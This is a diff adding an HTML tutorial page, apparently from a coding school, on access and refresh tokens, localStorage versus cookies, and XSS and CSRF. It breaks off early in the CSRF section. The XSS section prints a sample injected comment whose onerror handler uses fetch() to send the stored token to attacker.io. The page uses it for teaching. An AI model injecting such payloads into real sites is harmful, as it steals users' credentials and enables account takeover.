@@ -1,0 +1,1649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Access &amp; Refresh Tokens — Sheryians Coding School</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Fraunces:ital,wght@0,300;0,600;0,700;0,900;1,300&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+/* ── Design Tokens ── */
+:root {
+  --ink:       #0E0F14;
+  --paper:     #F5F2EB;
+  --paper2:    #EDE9DF;
+  --paper3:    #E4DFD3;
+  --rule:      #D4CEBC;
+  --muted:     #6B6455;
+  --accent:    #C84B1F;
+  --accent2:   #1A6B4A;
+  --accent3:   #1B4587;
+  --gold:      #B8860B;
+  --code-bg:   #1A1C24;
+  --code-text: #E2DCCC;
+  --flag-c:    #5BA4CF;
+  --val-c:     #F4A261;
+}
+
+*, *::before, *::after { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background-color: var(--paper);
+  color: var(--ink);
+  font-family: 'DM Sans', sans-serif;
+  font-size: 15px;
+  line-height: 1.7;
+  margin: 0;
+}
+
+/* ── Keyframes ── */
+@keyframes fadeUp    { from { opacity:0; transform:translateY(16px);} to { opacity:1; transform:translateY(0);} }
+@keyframes slideInLeft  { from { opacity:0; transform:translateX(-40px);} to { opacity:1; transform:translateX(0);} }
+@keyframes slideInRight { from { opacity:0; transform:translateX(40px);} to { opacity:1; transform:translateX(0);} }
+@keyframes floatPulse{ 0%,100% { transform:translateY(0);} 50% { transform:translateY(-8px);} }
+@keyframes dataFlow  { from { stroke-dashoffset:200; } to { stroke-dashoffset:0; } }
+
+.animate-fade-up     { animation: fadeUp 0.4s ease both; }
+.animate-slide-left  { animation: slideInLeft 0.5s ease both; }
+.animate-slide-right { animation: slideInRight 0.5s ease both; }
+.animate-float-pulse { animation: floatPulse 2.5s ease-in-out infinite; }
+.animate-data-flow   { stroke-dasharray: 8 6; animation: dataFlow 1.5s linear infinite; }
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { animation-duration: .001s !important; animation-iteration-count: 1 !important; }
+  html { scroll-behavior: auto; }
+}
+
+/* ── Layout ── */
+.layout-container { display: flex; min-height: 100vh; }
+.sidebar {
+  width: 260px; flex-shrink: 0;
+  background-color: var(--ink);
+  position: sticky; top: 0; height: 100vh;
+  overflow-y: auto; padding: 32px 0 40px;
+}
+.main-content { flex: 1; max-width: calc(100% - 260px); padding: 56px 56px 80px; }
+
+/* ── Sidebar ── */
+.nav-brand { padding: 0 24px; margin-bottom: 24px; }
+.nav-brand .logo { font-family:'Fraunces',serif; font-size:18px; font-weight:700; color:#FFF; }
+.nav-brand .logo .accent-dot { color: var(--accent); }
+.nav-brand .sub { font-family:'IBM Plex Mono',monospace; font-size:10px; color:rgba(255,255,255,.35); letter-spacing:.06em; margin-top:2px; }
+.nav-group-label {
+  font-family:'IBM Plex Mono',monospace; font-size:9px; color:rgba(255,255,255,.25);
+  letter-spacing:.12em; text-transform:uppercase; padding:0 24px; margin-top:16px; margin-bottom:4px;
+}
+.nav-link {
+  display:flex; align-items:center; gap:8px; padding:10px 24px;
+  font-family:'DM Sans',sans-serif; font-size:12.5px; color:rgba(255,255,255,.5);
+  border-left:2px solid transparent; text-decoration:none;
+  transition: color 150ms ease, background-color 150ms ease;
+}
+.nav-link:hover { color:#FFF; background-color:rgba(255,255,255,.04); }
+.nav-link.active { color:#FFF; border-left-color:var(--accent); background-color:rgba(200,75,31,.08); }
+.nav-link:focus-visible { outline:2px solid var(--accent); outline-offset:-2px; }
+.nav-num {
+  width:18px; height:18px; display:flex; align-items:center; justify-content:center; flex-shrink:0;
+  background-color:rgba(255,255,255,.08); font-family:'IBM Plex Mono',monospace; font-size:9px;
+  border-radius:4px; color:inherit;
+}
+.nav-link:hover .nav-num, .nav-link.active .nav-num { background-color:var(--accent); color:#FFF; }
+
+/* ── Hero ── */
+.hero { margin-bottom:64px; padding-bottom:40px; border-bottom:2px solid var(--rule); }
+.hero-eyebrow { font-family:'IBM Plex Mono',monospace; font-size:11px; color:var(--accent); text-transform:uppercase; letter-spacing:.12em; }
+.hero h1 {
+  font-family:'Fraunces',serif; font-size:clamp(36px,5vw,58px); font-weight:900;
+  color:var(--ink); line-height:1.05; letter-spacing:-.02em; margin:12px 0 16px;
+}
+.hero h1 em { font-style:normal; color:var(--accent); }
+.hero-desc { font-family:'DM Sans',sans-serif; font-size:16px; color:var(--muted); max-width:560px; line-height:1.65; }
+.hero-tags { display:flex; flex-wrap:wrap; gap:8px; margin-top:24px; }
+.hero-tag { font-family:'IBM Plex Mono',monospace; font-size:11px; color:var(--muted); border:1px solid var(--rule); border-radius:9999px; padding:2px 12px; }
+
+/* ── Sections ── */
+.section-block { margin-bottom:72px; scroll-margin-top:24px; }
+.section-header { display:flex; align-items:flex-start; gap:16px; margin-bottom:28px; }
+.section-header-text { padding-top:4px; }
+.section-num-big { font-family:'Fraunces',serif; font-size:48px; font-weight:900; color:var(--rule); user-select:none; line-height:1; }
+.section-title { font-family:'Fraunces',serif; font-size:26px; font-weight:700; color:var(--ink); line-height:1.2; }
+.section-subtitle { font-family:'DM Sans',sans-serif; font-size:13px; color:var(--muted); margin-top:4px; }
+
+h3 { font-family:'Fraunces',serif; font-size:18px; font-weight:600; color:var(--ink); margin-top:28px; margin-bottom:12px; }
+h4 { font-family:'IBM Plex Mono',monospace; font-size:12px; color:var(--muted); text-transform:uppercase; letter-spacing:.08em; margin-top:24px; margin-bottom:8px; }
+p { font-family:'DM Sans',sans-serif; font-size:14.5px; color:#2A2720; line-height:1.7; margin-bottom:12px; max-width:74ch; }
+ul, ol { max-width:74ch; font-size:14.5px; color:#2A2720; padding-left:20px; }
+li { margin-bottom:6px; }
+strong { color: var(--ink); font-weight:500; }
+code, .inline-code {
+  font-family:'IBM Plex Mono',monospace; font-size:12px; color:var(--accent);
+  background-color:var(--paper3); border:1px solid var(--rule); border-radius:4px; padding:2px 4px;
+}
+
+/* ── Boxes ── */
+.concept-box { background-color:var(--paper2); border-left:3px solid var(--accent3); border-radius:0 8px 8px 0; padding:16px 20px; margin:16px 0; }
+.concept-box-label { font-family:'IBM Plex Mono',monospace; font-size:9px; color:var(--accent3); text-transform:uppercase; letter-spacing:.12em; margin-bottom:8px; }
+.concept-box-text { font-family:'DM Sans',sans-serif; font-size:14px; color:var(--ink); line-height:1.65; margin:0; }
+
+.note-box { background-color:#FEF9EC; border:1px solid #EDD97A; border-radius:8px; padding:12px 16px; margin:16px 0; display:flex; gap:12px; align-items:flex-start; }
+.note-box-icon { font-size:18px; line-height:1; margin-top:2px; }
+.note-box-text { font-family:'DM Sans',sans-serif; font-size:13px; color:#5C4A00; margin:0; }
+.note-box-text strong { color:#3D3000; }
+
+.warning-box { background-color:#FEF2F2; border:1px solid #FCA5A5; border-radius:8px; padding:12px 16px; margin:16px 0; display:flex; gap:12px; align-items:flex-start; }
+.warning-box-icon { font-size:18px; line-height:1; margin-top:2px; }
+.warning-box-text { font-family:'DM Sans',sans-serif; font-size:13px; color:#7F1D1D; margin:0; }
+.warning-box-text strong { color:#5C1010; }
+
+/* ── Badges ── */
+.badge { display:inline-block; font-family:'IBM Plex Mono',monospace; font-size:10px; font-weight:600; color:#FFF; text-transform:uppercase; letter-spacing:.06em; padding:2px 10px; border-radius:4px; }
+.badge-accent { background-color:var(--accent); }
+.badge-green  { background-color:var(--accent2); }
+.badge-blue   { background-color:var(--accent3); }
+.badge-gold   { background-color:var(--gold); }
+
+/* ── Code block ── */
+.code-block { border-radius:8px; overflow:hidden; border:1px solid rgba(255,255,255,.06); margin:16px 0; }
+.code-header { display:flex; align-items:center; justify-content:space-between; padding:8px 16px; background-color:#13141A; border-bottom:1px solid rgba(255,255,255,.06); }
+.code-label { font-family:'IBM Plex Mono',monospace; font-size:10px; color:rgba(255,255,255,.4); text-transform:uppercase; letter-spacing:.08em; }
+.code-copy-btn { background:none; border:none; font-family:'IBM Plex Mono',monospace; font-size:10px; color:rgba(255,255,255,.3); text-transform:uppercase; letter-spacing:.06em; cursor:pointer; transition:color 150ms ease; }
+.code-copy-btn:hover { color:rgba(255,255,255,.7); }
+.code-pre { background-color:var(--code-bg); color:var(--code-text); font-family:'IBM Plex Mono',monospace; font-size:12.5px; line-height:1.75; padding:16px 20px; overflow-x:auto; margin:0; }
+.token-command  { color:#87CEEB; font-weight:bold; }
+.token-flag     { color:#5BA4CF; }
+.token-val      { color:#F4A261; }
+.token-string   { color:#98C379; }
+.token-comment  { color:rgba(255,255,255,.3); font-style:italic; }
+.token-yaml-key { color:#C678DD; }
+.token-operator { color:#E5C07B; }
+
+/* ── Tables ── */
+.flag-table { width:100%; border-collapse:collapse; font-family:'DM Sans',sans-serif; font-size:14px; margin:16px 0; }
+.flag-table th { font-family:'IBM Plex Mono',monospace; font-size:10px; color:var(--muted); text-transform:uppercase; letter-spacing:.06em; background-color:var(--paper3); text-align:left; padding:8px 12px; border:1px solid var(--rule); }
+.flag-table td { padding:8px 12px; border:1px solid var(--rule); vertical-align:top; }
+.flag-table tbody tr { transition:background-color 100ms ease; }
+.flag-table tbody tr:hover { background-color:var(--paper2); }
+.flag-name { font-family:'IBM Plex Mono',monospace; font-size:12px; font-weight:600; color:var(--flag-c); }
+.flag-val  { font-family:'IBM Plex Mono',monospace; font-size:11px; color:var(--val-c); }
+
+.compare-table { width:100%; border-collapse:collapse; font-family:'DM Sans',sans-serif; font-size:14px; margin:16px 0; border-radius:8px; overflow:hidden; }
+.compare-table th { background-color:var(--ink); color:#FFF; font-size:13px; font-weight:600; text-align:left; padding:12px 16px; border:1px solid var(--ink); }
+.compare-table td { font-size:13px; padding:12px 16px; border:1px solid var(--rule); vertical-align:top; }
+.compare-table tbody tr { transition:background-color 100ms ease; }
+.compare-table tbody tr:hover { background-color:var(--paper2); }
+.compare-table .cell-title { font-weight:600; color:var(--ink); }
+.compare-table .cell-muted { color:var(--muted); }
+.compare-table .cell-highlight { color:var(--accent2); font-weight:500; }
+.compare-table .cell-bad { color:var(--accent); font-weight:500; }
+.table-scroll { overflow-x:auto; }
+
+/* ── Flow diagram ── */
+.flow-diagram { display:flex; flex-direction:column; gap:0; margin:16px 0; }
+.flow-step { display:flex; gap:16px; }
+.flow-connector { display:flex; flex-direction:column; align-items:center; }
+.flow-dot { width:10px; height:10px; border-radius:50%; flex-shrink:0; margin-top:4px; }
+.flow-dot-accent { background-color:var(--accent); }
+.flow-dot-green  { background-color:var(--accent2); }
+.flow-dot-blue   { background-color:var(--accent3); }
+.flow-line { width:2px; background-color:var(--rule); flex:1; margin:4px 0; }
+.flow-content { padding-bottom:16px; }
+.flow-title { font-family:'DM Sans',sans-serif; font-size:14px; font-weight:600; color:var(--ink); }
+.flow-desc { font-family:'DM Sans',sans-serif; font-size:12.5px; color:var(--muted); margin-top:2px; }
+
+/* ── Scale diagram ── */
+.scale-diagram { background-color:var(--paper2); border:1px solid var(--rule); border-radius:10px; padding:16px 20px; margin:16px 0; font-family:'IBM Plex Mono',monospace; font-size:12px; line-height:2; color:var(--muted); }
+.scale-diagram .highlight { color:var(--ink); font-weight:bold; }
+.scale-diagram .green { color:var(--accent2); }
+.scale-diagram .red   { color:var(--accent); }
+
+.divider { border:none; border-top:1px solid var(--rule); margin:40px 0; }
+
+/* ── Step-through diagram ── */
+.stepper { border:1px solid var(--rule); border-radius:12px; background-color:var(--paper2); margin:20px 0; overflow:hidden; }
+.stepper-stage { padding:20px 20px 4px; }
+.stepper svg { width:100%; height:auto; display:block; }
+.stepper-caption { padding:0 20px 16px; min-height:64px; }
+.stepper-cap-label { font-family:'IBM Plex Mono',monospace; font-size:9px; text-transform:uppercase; letter-spacing:.12em; color:var(--accent); margin-bottom:4px; }
+.stepper-cap-text { font-family:'DM Sans',sans-serif; font-size:13.5px; color:var(--ink); line-height:1.6; margin:0; max-width:70ch; }
+.stepper-cap.hidden { display:none; }
+.stepper-controls { display:flex; align-items:center; justify-content:space-between; gap:12px; padding:10px 20px; border-top:1px solid var(--rule); background-color:var(--paper3); }
+.step-btn { font-family:'IBM Plex Mono',monospace; font-size:10px; text-transform:uppercase; letter-spacing:.08em; color:#FFF; background-color:var(--ink); border:none; border-radius:6px; padding:7px 14px; cursor:pointer; transition:background-color 150ms ease, opacity 150ms ease; }
+.step-btn:hover:not(:disabled) { background-color:var(--accent); }
+.step-btn:disabled { opacity:.3; cursor:not-allowed; }
+.step-btn:focus-visible { outline:2px solid var(--accent); outline-offset:2px; }
+.step-counter { font-family:'IBM Plex Mono',monospace; font-size:11px; color:var(--muted); letter-spacing:.08em; }
+.svg-box-label { font-family:'IBM Plex Mono',monospace; font-size:9px; letter-spacing:.08em; text-transform:uppercase; }
+.svg-text { font-family:'DM Sans',sans-serif; font-size:11px; }
+.svg-mono { font-family:'IBM Plex Mono',monospace; font-size:10px; }
+
+/* ── Quiz ── */
+.quiz-box { background-color:var(--ink); border-radius:12px; padding:24px; margin:32px 0; border:1px solid rgba(255,255,255,.08); }
+.quiz-question { font-family:'DM Sans',sans-serif; font-size:15px; color:#FFF; font-weight:500; line-height:1.6; margin:0 0 20px; max-width:none; }
+.quiz-options { display:flex; flex-direction:column; gap:12px; }
+.quiz-option { text-align:left; font-family:'DM Sans',sans-serif; font-size:13.5px; color:rgba(255,255,255,.7); background:transparent; border:1px solid rgba(255,255,255,.12); border-radius:8px; padding:12px 16px; cursor:pointer; transition:all 200ms ease; }
+.quiz-option:hover:not(:disabled) { border-color:var(--accent); color:#FFF; background-color:rgba(200,75,31,.08); }
+.quiz-option:focus-visible { outline:2px solid var(--accent); outline-offset:2px; }
+.quiz-option.correct { border-color:var(--accent2)!important; background-color:rgba(26,107,74,.15)!important; color:#FFF!important; opacity:1!important; }
+.quiz-option.incorrect { border-color:var(--accent)!important; background-color:rgba(200,75,31,.15)!important; color:#FFF!important; opacity:1!important; }
+.quiz-feedback { margin-top:16px; font-family:'IBM Plex Mono',monospace; font-size:11px; text-transform:uppercase; letter-spacing:.08em; }
+.quiz-feedback.correct { color:var(--accent2); }
+.quiz-feedback.incorrect { color:var(--accent); }
+.quiz-feedback.hidden { display:none; }
+.cursor-not-allowed { cursor:not-allowed; }
+
+/* ── Footer ── */
+.site-footer { display:flex; align-items:center; justify-content:space-between; gap:16px; flex-wrap:wrap; font-family:'IBM Plex Mono',monospace; font-size:11px; color:var(--muted); border-top:2px solid var(--rule); padding-top:16px; margin-top:64px; }
+
+@media (max-width:768px) {
+  .layout-container { flex-direction:column; }
+  .sidebar { width:100%; height:auto; position:relative; padding:20px 0; }
+  .main-content { max-width:100%; padding:32px 24px 64px; }
+  .section-num-big { font-size:34px; }
+}
+</style>
+</head>
+<body>
+<div class="layout-container">
+
+<nav class="sidebar">
+  <div class="nav-brand">
+    <div class="logo">Auth<span class="accent-dot">.</span>Tokens</div>
+    <div class="sub">Sheryians Coding School</div>
+  </div>
+
+  <div class="nav-group-label">The Problem</div>
+  <a href="#s1" class="nav-link active"><span class="nav-num">1</span>Why Tokens Exist</a>
+  <a href="#s2" class="nav-link"><span class="nav-num">2</span>One Token, Two Bad Homes</a>
+  <a href="#s3" class="nav-link"><span class="nav-num">3</span>Attack 1 — XSS</a>
+  <a href="#s4" class="nav-link"><span class="nav-num">4</span>Attack 2 — CSRF</a>
+
+  <div class="nav-group-label">The Solution</div>
+  <a href="#s5" class="nav-link"><span class="nav-num">5</span>Split Into Two Tokens</a>
+  <a href="#s6" class="nav-link"><span class="nav-num">6</span>Rotation &amp; Reuse Detection</a>
+
+  <div class="nav-group-label">In Practice</div>
+  <a href="#s7" class="nav-link"><span class="nav-num">7</span>Best Practices</a>
+  <a href="#s8" class="nav-link"><span class="nav-num">8</span>The Loopholes</a>
+  <a href="#s9" class="nav-link"><span class="nav-num">9</span>Closing The Gaps</a>
+</nav>
+
+<main class="main-content">
+
+<header class="hero animate-fade-up">
+  <div class="hero-eyebrow">Backend / Authentication</div>
+  <h1>Access &amp; refresh tokens,<br>and the attacks that <em>shaped them</em></h1>
+  <p class="hero-desc">
+    Almost every tutorial tells you to keep the access token in memory and the refresh token
+    in an httpOnly cookie. Very few tell you which attack each half is answering, or where
+    the whole design still falls apart. That is what these notes are for.
+  </p>
+  <div class="hero-tags">
+    <span class="hero-tag">JWT</span>
+    <span class="hero-tag">XSS</span>
+    <span class="hero-tag">CSRF</span>
+    <span class="hero-tag">Token Rotation</span>
+    <span class="hero-tag">MERN</span>
+  </div>
+</header>
+
+<!-- ════════════ 01 ════════════ -->
+<section class="section-block animate-fade-up" id="s1">
+  <div class="section-header">
+    <div class="section-num-big">01</div>
+    <div class="section-header-text">
+      <div class="section-title">Why tokens exist at all</div>
+      <div class="section-subtitle">Start from the problem, not the solution</div>
+    </div>
+  </div>
+
+  <p>
+    HTTP is stateless. The server handles your request, sends a response, and forgets you completely.
+    The next request from the same person arrives looking exactly like a request from a total stranger.
+  </p>
+  <p>
+    So on every single request, the client has to re-prove who it is. The obvious idea — send the
+    password every time — is a disaster: the password travels constantly, sits in logs, and can never
+    be revoked without changing it.
+  </p>
+  <p>
+    Instead the server issues a <strong>token</strong> after one successful login. The client attaches
+    that token to every request. The server verifies it and knows who is calling.
+  </p>
+
+  <div class="concept-box">
+    <div class="concept-box-label">Key Concept</div>
+    <p class="concept-box-text">
+      <strong>A token is a bearer credential.</strong> The server has no way to check that the person
+      presenting it is the person it was issued to. Possession equals authority. Whoever holds the token
+      <em>is</em> the user, as far as the server is concerned. Every problem in the rest of these notes
+      grows out of this one sentence.
+    </p>
+  </div>
+
+  <p>
+    Which means the entire security question reduces to: <strong>where do you keep the token,
+    and who else can get to it there?</strong>
+  </p>
+</section>
+
+<!-- ════════════ 02 ════════════ -->
+<section class="section-block animate-fade-up" id="s2">
+  <div class="section-header">
+    <div class="section-num-big">02</div>
+    <div class="section-header-text">
+      <div class="section-title">One token, two bad homes</div>
+      <div class="section-subtitle">The single-token design and why both storage choices lose</div>
+    </div>
+  </div>
+
+  <p>
+    The simple design: one long-lived token, valid for days or weeks. The browser gives you exactly
+    two realistic places to keep it, and each one has a fatal flaw.
+  </p>
+
+  <h3>Option A — localStorage</h3>
+  <p>
+    Readable and writable by JavaScript. You attach it yourself in an <code>Authorization</code> header.
+    It survives tab close and browser restart because it lives on disk.
+  </p>
+  <p>
+    The flaw: <strong>any JavaScript running on your origin can read it.</strong> Not just your code —
+    any code. A compromised npm package, a third-party analytics script, an injected payload. They all
+    have the same access your own code does.
+  </p>
+
+  <h3>Option B — a cookie</h3>
+  <p>
+    The browser stores it and attaches it automatically to every request going to that domain. You write
+    no client code at all. If you mark it <code>httpOnly</code>, JavaScript cannot even read it.
+  </p>
+  <p>
+    The flaw: <strong>the browser attaches it automatically, and does not care who initiated the request.</strong>
+    A request triggered by a completely different website still arrives at your API fully authenticated.
+  </p>
+
+  <div class="table-scroll">
+  <table class="compare-table">
+    <thead>
+      <tr><th>Property</th><th>localStorage</th><th>Cookie</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td class="cell-title">Readable by JavaScript</td>
+        <td class="cell-bad">Yes — by any script on the origin</td>
+        <td class="cell-highlight">No, if httpOnly is set</td>
+      </tr>
+      <tr>
+        <td class="cell-title">Attached to requests</td>
+        <td class="cell-highlight">Manually, by your code only</td>
+        <td class="cell-bad">Automatically, by the browser</td>
+      </tr>
+      <tr>
+        <td class="cell-title">Survives tab close</td>
+        <td class="cell-muted">Yes — sits on disk</td>
+        <td class="cell-muted">Yes, until Max-Age expires</td>
+      </tr>
+      <tr>
+        <td class="cell-title">Vulnerable to XSS</td>
+        <td class="cell-bad">Fully — one line steals it</td>
+        <td class="cell-highlight">Cannot be read out</td>
+      </tr>
+      <tr>
+        <td class="cell-title">Vulnerable to CSRF</td>
+        <td class="cell-highlight">No — never auto-sent</td>
+        <td class="cell-bad">Yes — that is the whole attack</td>
+      </tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="concept-box">
+    <div class="concept-box-label">The Dilemma</div>
+    <p class="concept-box-text">
+      Look at the last two rows. Each storage location is strong exactly where the other is weak.
+      With a single token you must pick one column, which means you must accept one of the two attacks.
+      <strong>There is no winning single-token answer.</strong> That is the problem the two-token
+      design was invented to solve.
+    </p>
+  </div>
+
+  <p>Before the solution, you need to understand both attacks properly. That is the next two sections.</p>
+
+  <div class="quiz-box">
+    <p class="quiz-question">Why can a single-token system never be safe from both XSS and CSRF at the same time?</p>
+    <div class="quiz-options" id="quiz-2-1">
+      <button onclick="answerQuiz('quiz-2-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; Because the two storage options have opposite weaknesses, so choosing one accepts the other's attack</button>
+      <button onclick="answerQuiz('quiz-2-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; Because a single token is always too long-lived to be secure</button>
+    </div>
+    <div class="quiz-feedback hidden" id="quiz-2-1-feedback"></div>
+  </div>
+</section>
+
+<!-- ════════════ 03 ════════════ -->
+<section class="section-block animate-fade-up" id="s3">
+  <div class="section-header">
+    <div class="section-num-big">03</div>
+    <div class="section-header-text">
+      <div class="section-title">Attack 1 — Cross-Site Scripting</div>
+      <div class="section-subtitle">An attacker gets JavaScript running on your own origin</div>
+    </div>
+  </div>
+
+  <p>
+    XSS is not "someone hacked your server." It is much simpler and much more common:
+    <strong>attacker-controlled JavaScript ends up executing on your domain.</strong>
+    Once that happens, the browser treats it as your code, because as far as the browser
+    can tell, it <em>is</em> your code. Same origin, same permissions.
+  </p>
+
+  <h4>How it usually gets in</h4>
+  <ul>
+    <li>User input rendered into the DOM without escaping — comments, bios, product reviews, chat messages</li>
+    <li>A compromised or typosquatted npm package somewhere in your dependency tree</li>
+    <li>A third-party script (analytics, chat widget, ad tag) loaded on your authenticated pages</li>
+    <li>A browser extension the user installed months ago</li>
+  </ul>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">The vulnerable code</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-comment">// Any place user input reaches the DOM unescaped</span>
+&lt;<span class="token-command">div</span> <span class="token-flag">dangerouslySetInnerHTML</span>={{ __html: comment.body }} /&gt;
+
+<span class="token-comment">// The attacker submits this as their "comment":</span>
+&lt;<span class="token-command">img</span> <span class="token-flag">src</span>=<span class="token-val">x</span> <span class="token-flag">onerror</span>=<span class="token-string">"fetch('https://attacker.io/c?t=' + localStorage.getItem('token'))"</span>&gt;</pre>
+  </div>
+
+  <p>
+    Every visitor who loads that comment now silently ships their token to the attacker.
+    Walk through what actually happens:
+  </p>
+
+  <div class="stepper" data-stepper>
+    <div class="stepper-stage">
+      <svg viewBox="0 0 880 380" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Step-through diagram of a cross-site scripting token theft">
+        <defs>
+          <marker id="ah-xss" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+            <path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--accent)"/>
+          </marker>
+          <marker id="ah-xss2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+            <path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--ink)"/>
+          </marker>
+        </defs>
+
+        <!-- Browser shell -->
+        <rect x="18" y="42" width="360" height="300" rx="10" fill="var(--paper)" stroke="var(--rule)" stroke-width="1.5"/>
+        <text x="34" y="32" class="svg-box-label" fill="var(--muted)">Victim's Browser</text>
+        <circle cx="40" cy="62" r="4" fill="var(--rule)"/><circle cx="54" cy="62" r="4" fill="var(--rule)"/><circle cx="68" cy="62" r="4" fill="var(--rule)"/>
+        <rect x="34" y="80" width="328" height="246" rx="7" fill="var(--paper2)" stroke="var(--rule)"/>
+        <text x="50" y="102" class="svg-mono" fill="var(--muted)">origin: yourapp.com</text>
+
+        <!-- localStorage -->
+        <rect x="52" y="242" width="292" height="66" rx="7" fill="var(--paper3)" stroke="var(--rule)"/>
+        <text x="66" y="266" class="svg-box-label" fill="var(--muted)">localStorage</text>
+        <text x="66" y="290" class="svg-mono" fill="var(--accent)">token: "eyJhbGciOiJIUzI1NiIs..."</text>
+
+        <!-- Attacker server -->
+        <rect x="618" y="46" width="240" height="86" rx="9" fill="var(--ink)"/>
+        <text x="638" y="76" class="svg-box-label" fill="#FFF">attacker.io</text>
+        <text x="638" y="100" class="svg-text" fill="rgba(255,255,255,.55)">Collects stolen tokens</text>
+
+        <!-- Your API -->
+        <rect x="618" y="252" width="240" height="86" rx="9" fill="var(--paper3)" stroke="var(--rule)" stroke-width="1.5"/>
+        <text x="638" y="282" class="svg-box-label" fill="var(--muted)">api.yourapp.com</text>
+        <text x="638" y="306" class="svg-text" fill="var(--muted)">Sees a valid token</text>
+
+        <!-- Step 1 -->
+        <g data-step="1">
+          <rect x="52" y="126" width="292" height="66" rx="7" fill="#FEF2F2" stroke="var(--accent)" stroke-width="1.5"/>
+          <text x="66" y="150" class="svg-box-label" fill="var(--accent)">Injected script</text>
+          <text x="66" y="174" class="svg-mono" fill="var(--ink)">running as first-party code</text>
+        </g>
+
+        <!-- Step 2 -->
+        <g data-step="2">
+          <path d="M198,196 L198,236" stroke="var(--ink)" stroke-width="2" fill="none" marker-end="url(#ah-xss2)"/>
+          <text x="212" y="222" class="svg-mono" fill="var(--ink)">getItem('token')</text>
+        </g>
+
+        <!-- Step 3 -->
+        <g data-step="3">
+          <path d="M382,180 C480,180 520,100 612,92" stroke="var(--accent)" stroke-width="2.5" fill="none"
+                marker-end="url(#ah-xss)" class="animate-data-flow"/>
+          <text x="432" y="132" class="svg-mono" fill="var(--accent)">fetch → token exfiltrated</text>
+        </g>
+
+        <!-- Step 4 -->
+        <g data-step="4">
+          <path d="M738,140 L738,244" stroke="var(--accent)" stroke-width="2.5" fill="none" marker-end="url(#ah-xss)"/>
+          <text x="752" y="198" class="svg-mono" fill="var(--accent)">replay</text>
+          <text x="618" y="366" class="svg-text" fill="var(--accent)">From the attacker's own machine</text>
+        </g>
+      </svg>
+    </div>
+
+    <div class="stepper-caption">
+      <div class="stepper-cap" data-cap="1">
+        <div class="stepper-cap-label">Step 01 — Execution</div>
+        <p class="stepper-cap-text">The payload lands on your origin. It does not matter how it got there. From this moment the attacker's code has exactly the same privileges as the code you wrote.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="2">
+        <div class="stepper-cap-label">Step 02 — Read</div>
+        <p class="stepper-cap-text">The script calls <code>localStorage.getItem('token')</code>. There is no permission check to fail. localStorage was never designed as a secrets vault — it is same-origin shared storage, and the attacker is now same-origin.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="3">
+        <div class="stepper-cap-label">Step 03 — Exfiltration</div>
+        <p class="stepper-cap-text">One <code>fetch()</code> and the credential is sitting on the attacker's server. This is the step that changes everything — the token has now physically left the victim's machine.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="4">
+        <div class="stepper-cap-label">Step 04 — Replay</div>
+        <p class="stepper-cap-text">The attacker no longer needs the victim at all. Tab closed, laptop shut, user asleep — irrelevant. They hold a working credential for its full lifetime, replayable from their own infrastructure, and scriptable across every victim who ever loaded that page.</p>
+      </div>
+    </div>
+
+    <div class="stepper-controls">
+      <button class="step-btn step-prev">← Back</button>
+      <span class="step-counter">01 / 04</span>
+      <button class="step-btn step-next">Forward →</button>
+    </div>
+  </div>
+
+  <div class="warning-box">
+    <div class="warning-box-icon">⚠️</div>
+    <p class="warning-box-text">
+      Step 03 is the one that hurts. A script running in a page is a nuisance that ends when the tab closes.
+      <strong>A credential on the attacker's server is a persistent account takeover</strong> that survives
+      everything the user does. Keep that distinction in mind — the entire two-token design is built around it.
+    </p>
+  </div>
+
+  <div class="quiz-box">
+    <p class="quiz-question">Why can an XSS payload read a token from localStorage without any permission prompt?</p>
+    <div class="quiz-options" id="quiz-3-1">
+      <button onclick="answerQuiz('quiz-3-1', this, false)" class="quiz-option">A &nbsp;—&nbsp; Because localStorage has no encryption applied to its values</button>
+      <button onclick="answerQuiz('quiz-3-1', this, true)" class="quiz-option">B &nbsp;—&nbsp; Because it runs on your origin, so the browser gives it the same access your own code has</button>
+    </div>
+    <div class="quiz-feedback hidden" id="quiz-3-1-feedback"></div>
+  </div>
+</section>
+
+<!-- ════════════ 04 ════════════ -->
+<section class="section-block animate-fade-up" id="s4">
+  <div class="section-header">
+    <div class="section-num-big">04</div>
+    <div class="section-header-text">
+      <div class="section-title">Attack 2 — Cross-Site Request Forgery</div>
+      <div class="section-subtitle">The attacker never sees your token, and never needs to</div>
+    </div>
+  </div>
+
+  <p>
+    CSRF is the mirror image of XSS, and students almost always confuse the two. The distinction
+    is worth being precise about:
+  </p>
+
+  <div class="table-scroll">
+  <table class="compare-table">
+    <thead><tr><th>&nbsp;</th><th>XSS</th><th>CSRF</th></tr></thead>
+    <tbody>
+      <tr><td class="cell-title">Where the code runs</td><td class="cell-muted">On your site</td><td class="cell-muted">On the attacker's site</td></tr>
+      <tr><td class="cell-title">What the attacker steals</td><td class="cell-muted">The credential itself</td><td class="cell-muted">Nothing — they steal an <em>action</em></td></tr>
+      <tr><td class="cell-title">Can they read the response?</td><td class="cell-muted">Yes, fully</td><td class="cell-muted">No — the browser blocks it</td></tr>
+      <tr><td class="cell-title">What makes it work</td><td class="cell-muted">Same-origin script access</td><td class="cell-muted">Cookies being attached automatically</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="concept-box">
+    <div class="concept-box-label">Key Concept</div>
+    <p class="concept-box-text">
